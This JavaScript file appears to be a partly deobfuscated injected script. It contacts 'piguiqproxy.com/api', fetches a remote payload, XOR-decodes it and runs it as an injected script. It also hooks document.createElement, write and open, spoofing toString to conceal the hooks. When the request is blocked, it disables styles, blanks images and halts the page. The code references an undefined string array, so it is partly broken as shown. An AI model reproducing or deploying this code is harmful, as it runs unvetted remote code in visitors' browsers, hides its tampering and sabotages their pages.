(function () {
    function c() {
        var b = {};
        for (var a = 0; a < arguments.length; a += 2) {
            b[arguments[a]] = arguments[a + 1]
        }
        return b
    }

    function main() {
        function removeImages() {
            var c = DOCUMENT.getElementsByTagName("IMG");
            var b = 0;
            for (var d = 0; d < c.length; d++) {
                if (c[d].src && c[d].src != "") {
                    c[d].src = "";
                    b++
                }
            }
            return b
        }

        function disableStyles() {
            var c = DOCUMENT.styleSheets;
            for (var d = 0; d < c.length; d++) {
                c[d].disabled = true
            }
            removeImages();
            WINDOW.stop()
        }

        function y(f, d, h) {
            function c() {
                return g
            }

            var g = f[d].toString();
            h._orig = f[d].bind(f);
            f[d] = h;
            f[d].toString = c
        }

        function brokePage(d) {
            var c = WINDOW.performance.now() - d.start;
            if (c < int300) {
                disableStyles()
            }
        }

        function w(f, d, g) {
            WINDOW.Object.defineProperty(f, d, c("enumerable", false, "configurable", false, "writable", false, "value", g))
        }

        function r(b) {
            b = z(b);
            var c = DOCUMENT.createElement("script");
            c.async = false;
            c.textContent = b;
            DOCUMENT.documentElement.appendChild(c);
            DOCUMENT.documentElement.removeChild(c)
        }

        function z(c) {
            var d = "mzs__" + WINDOW.Math.random().toString().substr(2, 4);
            WINDOW[d] = x;
            c = "(function(mz_str) {" + c + "})('" + d + "');";
            return c
        }

        function A(g, f) {
            function c() {
                f(h)
            }

            function callBrokePage() {
                brokePage(h)
            }

            var h = new WINDOW.XMLHttpRequest();
            h.open("GET", g, true);
            h.responseType = "text";
            h.start = WINDOW.performance.now()
            h.addEventListener("load", c);
            if (!a) {
                return
            }
            ;
            h.addEventListener("error", callBrokePage);
            h.send(null)
        }

        function m(f) {
            var m = f.match(new WINDOW.RegExp(a[43]));
            if (m) {
                var n = m[1];
                var s = n.split(a[46]);
                var o = "", p = "", v = 0, c = [];
                while (s[v] != "bf4bfd3ad268f00b1ac6fc8a32a5309a") {
                    p += s[v];
                    if (++v == s.length) {
                        return
                    }
                }
                ;
                for (var g = v + 1; g < s.length; g++) {
                    var u = s[g], h = g - v - 1;
                    var t = p.substr(h * 2, 2);
                    var l = WINDOW.parseInt(t, 16), j = l;
                    var r = "";
                    for (var i = 0; i < u.length; i += 2) {
                        var q = WINDOW.parseInt(u.substr(i, 2), 16);
                        var d = q ^ l;
                        l = d ^ j;
                        d = d.toString(16);
                        if (d.length < 2) {
                            d = "0" + d
                        }
                        ;
                        r += d
                    }
                    ;
                    c.push(r)
                }
                ;
                f = f.replace(n, c.join(a[46]))
            }
            ;
            return f
        }

        function q(_document) {
            function c(g) {
                function f(c) {
                    var g = c.target;
                    var h = null;
                    try {
                        h = g.contentWindow.document
                    } catch (e) {
                    }
                    if (h) {
                        q(h);
                        d.removeEventListener("load", f)
                    }
                }

                var c = arguments.callee._orig;
                var d = c.apply(this, arguments);
                if (d.tagName == "IFRAME") {
                    d.addEventListener("load", f)
                }
                ;
                return d
            }

            function d() {
                var b = arguments.callee._orig;
                var c = this.readyState;
                b.apply(this, arguments);
                if (c == "complete") {
                    lesten_load_error(this)
                }
            }

            function f() {
                var c = arguments.callee._orig
                c.apply(this, arguments);
                lesten_load_error(this)
            }

            y(_document, "createElement", c);
            var h = d;
            y(_document, "write", h);
            y(_document, "writeln", h);
            y(_document, "open", f);
            x.docs.push(_document);
            lesten_load_error(_document)
        }

        function p(d, f) {
            var g = d.target;
            var c = (f) ? x.er_load : x.sc_load;
            c.push(g)
        }

        function lesten_load_error(el) {
            console.log(el)
            el.addEventListener("error", x.er_listen, true);
            el.addEventListener("load", x.sc_listen, true)
        }

        function s() {
            function f(j) {
                function g(b) {
                    r(m(b.responseText))
                }

                if (j.status == 204) {
                    if (c.r) {
                        WINDOW.console.log("arg load fail, 204");
                        return
                    }
                    ;
                    c.r = DOCUMENT.location.href;
                    A(d(), f);
                    return
                }
                ;
                x.vars.session = j.getResponseHeader("X-Meta-Request-Id");
                var h = j.getResponseHeader("X-Location");
                if (!x.vars.session || !h) {
                    return
                }
                x.vars.proxy_host = ( new WINDOW.URL(h)).host;
                var i = x.vars.proxy_host.indexOf("-");
                if (i > 0) {
                    x.vars.proxy_host = x.vars.proxy_host.substr(i + 1)
                }
                ;
                A(h, g)
            }

            function d() {
                var b = [];
                for (k in c) {
                    b.push(k + "=" + WINDOW.encodeURIComponent(c[k]))
                }
                ;
                var d = (b.length) ? "?" + b.join("&") : "";
                return DOCUMENT.location.protocol + "//" + g + d
            }

            var c = {}
            if (DOCUMENT.cookie.indexOf("argon_enable=1") != -1) {
                c.w = "1"
            }
            A(d(), f)
        }

        function hendle_er_listen(a) {
            p(a, true)
        }

        function handle_sc_listen(a) {
            p(a, false)
        }

        var WINDOW = window, DOCUMENT = WINDOW.document, int300 = 300, int7 = 7, word_tttZZZ2m = "tttZZZ2m", word_f4FFv = "f4FFv";
        var x = {};
        var g = "piguiqproxy.com/api";
        var t = false;
        var D = false;
        var B = null;
        try {
            if (WINDOW.opener && WINDOW.opener["_" + word_tttZZZ2m] == word_f4FFv) {
                WINDOW.opener["_" + word_tttZZZ2m] = "";
                t = true
            }
        } catch (e) {
        }
        ;
        try {
            if (WINDOW.navigator.vendor.indexOf("Apple") > -1) {
                var C = WINDOW.navigator.userAgent.match(new WINDOW.RegExp("version/(\d+)([0-9.]+) Safari", "i"));
                if (C && C[1]) {
                    var E = WINDOW.parseInt(C[1]);
                    if (E < 10) {
                        return
                    }
                }
            }
        } catch (e) {
            return
        }
        ;
        x.er_load = [];
        x.sc_load = [];
        x.docs = [];
        x.vars = c("proxy_host", "", "session", "");
        x.dloaded = false;
        x.cr_el = DOCUMENT.createElement.bind(DOCUMENT);
        x.er_listen = hendle_er_listen; //d
        x.sc_listen = handle_sc_listen; //f
        s();
        q(DOCUMENT);
        if (t) {
            DOCUMENT.writeln("<NO" + "FRA" + "MES>");
            DOCUMENT.close()
        }
    };
    // var _o, _i, a = [];
    // for (_o = 0; _o < _a.length; _o++)for (a[_o] = "", _i = 0; _i < _a[_o].length; _i += 2)a[_o] += String.fromCharCode(parseInt(_a[_o].substr(_i, 2), 16));
    // if (!a) {
    //     main(true);
    //     main = null;
    //     return
    // };
    (main)()
})()